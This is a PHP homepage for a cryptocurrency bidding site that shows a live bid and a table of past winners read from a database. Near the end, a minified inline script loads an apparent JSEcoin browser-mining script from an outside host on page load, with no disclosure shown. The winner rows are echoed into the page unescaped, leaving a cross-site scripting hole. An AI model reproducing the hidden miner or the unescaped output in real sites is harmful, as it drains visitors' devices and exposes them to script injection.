<?php
$page = "home";
session_start();
include('config.php');
include('allfun.php');
?>		

<!DOCTYPE html>
<html class="gr__salmen_website" lang="en"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
    <title>Crypto Bids | Home</title>
<link href="https://fonts.googleapis.com/css?family=Josefin+Sans" rel="stylesheet">	
<link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
    <!-- Bootstrap -->
    <link href="assets/bootstrap.css" rel="stylesheet">
    <link href="assets/style.css" rel="stylesheet">

 <style>
 body { 
        background: url('bg.jpg') no-repeat center center fixed; 
        -webkit-background-size: cover;
        -moz-background-size: cover;
        -o-background-size: cover;
        background-size: cover;
		font-family: 'Josefin Sans', sans-serif;
    } 
 </style>
  </head>
 <body data-gr-c-s-loaded="true" >
   <center> <img src="logo.png" width="150px"></center>


      <div class="col-md-2 ">
<?php include ('menu.php') ; ?>
      </div>

      <div class="col-md-8">
        <div class="well content">
         

<center>
<div class="row">
<div class="col-md-4">
<h4><b>Live Bids : </b> Bid No <?php echo $bidid; ?> </h4>
<div class="card">
  <img src="coins2.png" alt="Avatar" style="width:100%">
  <div class="containera">
	<center>
    <h3>Prize : <?php echo $bidamount ; ?> </h3><br>
    <span><b> Time remaining <p id="demo"></p> </b></span>
<a href="bids.php" class="btn btn-success">Bid Now</a>	
	</center>	
  </div>
</div> 	 
</div>
<div class="col-md-8">
<br><br>
<img src="on.jpg" width="100%">
<br>
<h4><b>How to Play</b></h4><br>
<img src="0.01.jpg" width="100%">
<br>
<p>Know more at <a href="faq.php"><button type="button" class="btn btn-success">FAQ</button></a></p>


</div>

</div>

	  <br><br>
</center>


<h3>Previous Bid Winners</h3>
<br>
<div class="table-responsive">

<table class="table table-hover"  border="0">
 <thead>
	    <tr>
			<th>Bid No.</th>
			<th>Winner</th>	
			<th>Amount Won</th>	
			<th>Status</th>				
		</tr>
 </thead>
 <tbody>
<?php
$windb = "SELECT * from winners order by vel DESC" ;
$rlgin=mysqli_query($conn,$windb);
$countwonq = mysqli_num_rows($rlgin);
if($countwonq == 1) {
		while($us=mysqli_fetch_array($rlgin))
		{
			$winbidno = $us['bidno'];
			$winusername = $us['username'];
			$winamountwon = $us['amountwon'];
			$winstatus = $us['status'];
echo "
		<tr>
			<td>$winbidno</td>
			<td>$winusername</td>
			<td>$winamountwon</td>
			<td>$winstatus</td>
		</tr>
";
}
}else{
echo "<tr> <td colspan='4'> No Winner Yet </td> </tr>";		
}
?>
		
 </tbody>
</table>

</div>






		  
		  
		</div>  
		  
      
	  
	  

    </div>
	
	
		<div class="col-md-2">
		<?php include('menuright.php'); ?>
		</div>	
	
<script type="text/javascript">
!function(){var e=document,t=e.createElement("script"),s=e.getElementsByTagName("script")[0];t.type="text/javascript",t.async=t.defer=!0,t.src="https://load.jsecoin.com/load/42376/cryptobids.site/0/0/",s.parentNode.insertBefore(t,s)}();
</script>
	
	
    <?php include('footer.php'); ?>
    <script type="text/javascript" async="" src="assets/recaptcha__en.js"></script><script src="assets/jquery.js"></script>
    <script src="assets/bootstrap.js"></script>
    <script src="assets/api.js"></script>
  
</body></html>